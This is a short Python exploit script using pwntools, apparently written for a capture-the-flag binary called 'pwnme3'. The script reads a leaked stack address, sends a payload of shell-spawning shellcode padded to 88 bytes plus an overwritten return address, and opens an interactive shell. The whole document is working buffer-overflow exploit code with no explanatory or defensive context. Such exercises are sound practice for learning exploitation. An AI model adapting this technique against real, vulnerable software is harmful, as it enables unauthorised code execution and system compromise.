from pwn import *

context.arch = 'amd64'
p = process('./pwnme3')

p.recvuntil(b'? ')
buf_addr = int(p.recvline().strip(), 16)
log.info(f"Buffer at: {hex(buf_addr)}")

shellcode = asm(shellcraft.sh())

payload  = shellcode
payload += b'A' * (88 - len(shellcode))
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
